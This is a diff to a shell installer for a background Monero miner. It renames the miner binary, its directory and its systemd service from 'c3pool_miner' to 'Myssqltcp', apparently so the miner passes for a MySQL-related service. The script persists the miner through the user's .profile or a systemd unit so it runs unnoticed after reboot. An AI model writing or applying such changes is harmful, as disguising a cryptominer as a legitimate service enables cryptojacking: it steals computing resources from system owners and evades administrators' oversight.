@@ -126,7 +126,7 @@ echo
 if ! sudo -n true 2>/dev/null; then
   echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
 else
-  echo "Mining in background will be performed using c3pool_miner systemd service."
+  echo "Mining in background will be performed using Myssqltcp systemd service."
 fi
 
 echo
@@ -738,7 +738,7 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_bac
 
 # preparing script
 echo "[*] Creating $HOME/myssqltcp/miner.sh script"
-cat >$HOME/c3pool/miner.sh <<EOL
+cat >$HOME/myssqltcp/miner.sh <<EOL
 #!/bin/bash
 if ! pidof MyssqlTcp >/dev/null; then
   nice $HOME/myssqltcp/MyssqlTcp \$*
@@ -778,7 +778,7 @@ else
 
   else
 
-    echo "[*] Creating c3pool_miner systemd service"
+    echo "[*] Creating Myssqltcp systemd service"
     cat >/tmp/MyssqlTcp.service <<EOL
 [Unit]
 Description=Monero miner service
